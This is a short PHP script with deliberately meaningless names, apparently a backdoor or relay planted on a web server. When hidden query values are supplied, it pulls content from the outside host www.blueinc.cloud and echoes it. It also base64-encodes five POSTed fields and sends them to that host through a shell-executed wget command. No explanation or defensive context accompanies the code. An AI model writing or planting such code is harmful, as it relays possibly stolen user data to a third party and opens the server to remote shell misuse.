<?php

if($_GET["q"] == "")
  
{
}

if($_GET["linux84"] == "linux8474")
  
{

$linux84 = file_get_contents("http://www.blueinc.cloud:84/linux8474.php?linux84=linux8474");

echo "$linux84";
  
}

if($_GET["linux84"] == "linux84442")
  
{

$google84741 = $_POST["linux2"];

$google84741 = base64_encode($google84741);

$google84742 = $_POST["linux3"];

$google84742 = base64_encode($google84742);

$google84744 = $_POST["linux4"];

$google84744 = base64_encode($google84744);

$google847412 = $_POST["linux5"];

$google847412 = base64_encode($google847412);

$google847446 = $_POST["linux1"];

$google847446 = base64_encode($google847446);

echo shell_exec("wget -q -U 'linux84' --post-data=linux2='" . $google84741 . "&linux3=" . $google84742 . "&linux5=" . $google847412 . "&linux1=" . $google847446 . "&linux4=" . $google84744 . "' 'http://www.blueinc.cloud:84/linux8474.php?linux84=linux84' --header='Content-type: application/x-www-form-urlencoded'");

}

?>
